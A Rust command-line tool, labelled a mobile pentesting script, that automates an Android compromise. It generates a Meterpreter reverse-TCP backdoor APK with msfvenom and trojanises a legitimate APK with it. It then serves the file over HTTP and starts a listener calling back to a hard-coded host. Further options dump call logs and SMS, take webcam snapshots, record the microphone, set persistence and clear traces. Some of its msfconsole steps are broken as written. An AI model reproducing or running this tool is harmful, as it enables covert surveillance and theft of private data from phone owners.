// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

use std::process::Command;
use std::io::{self, Write};

fn run_command(command: &str) {
    println!("[+] Executing: {}", command);
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output()
        .expect("Failed to execute command");
    
    println!("{}", String::from_utf8_lossy(&output.stdout));
}

fn check_adb() {
    run_command("adb devices");
    run_command("adb connect 192.168.170.101:5555");
}

fn adb_shell_access() {
    run_command("adb shell");
}

fn generate_payload() {
    run_command("msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk");
}

fn inject_payload() {
    print!("Enter path to original APK: ");
    io::stdout().flush().unwrap();
    let mut original_apk = String::new();
    io::stdin().read_line(&mut original_apk).unwrap();
    let command = format!("msfvenom -x {} -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk", original_apk.trim());
    run_command(&command);
}

fn start_http_server() {
    run_command("python3 -m http.server 8080 &");
}

fn start_msf_listener() {
    run_command("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
}

fn control_device() {
    run_command("msfconsole -q -x 'sessions'");
    print!("Enter session ID to interact with: ");
    io::stdout().flush().unwrap();
    let mut session_id = String::new();
    io::stdin().read_line(&mut session_id).unwrap();
    let command = format!("msfconsole -q -x 'sessions -i {}'", session_id.trim());
    run_command(&command);
}

fn extract_data() {
    run_command("msfconsole -q -x 'dump_calllog'");
    run_command("msfconsole -q -x 'dump_sms'");
    run_command("msfconsole -q -x 'webcam_snap'");
    run_command("msfconsole -q -x 'record_mic 10'");
}

fn maintain_access() {
    run_command("msfconsole -q -x 'run persistence -A'");
}

fn clear_traces() {
    run_command("adb shell rm /sdcard/backdoor.apk");
}

fn main() {
    loop {
        println!("\n[ Mobile Pentesting Automation ]");
        println!("1) Check ADB Connection");
        println!("2) Gain ADB Shell Access");
        println!("3) Generate Malicious APK");
        println!("4) Inject Payload into APK");
        println!("5) Start HTTP Server for Deployment");
        println!("6) Start Metasploit Listener");
        println!("7) Control Compromised Device");
        println!("8) Extract Data from Target");
        println!("9) Maintain Access");
        println!("10) Clear Traces");
        println!("11) Exit");
        print!("Choose an option: ");
        io::stdout().flush().unwrap();
        
        let mut choice = String::new();
        io::stdin().read_line(&mut choice).unwrap();
        let choice: u32 = match choice.trim().parse() {
            Ok(num) => num,
            Err(_) => continue,
        };
        
        match choice {
            1 => check_adb(),
            2 => adb_shell_access(),
            3 => generate_payload(),
            4 => inject_payload(),
            5 => start_http_server(),
            6 => start_msf_listener(),
            7 => control_device(),
            8 => extract_data(),
            9 => maintain_access(),
            10 => clear_traces(),
            11 => break,
            _ => println!("Invalid option, please try again."),
        }
    }
}
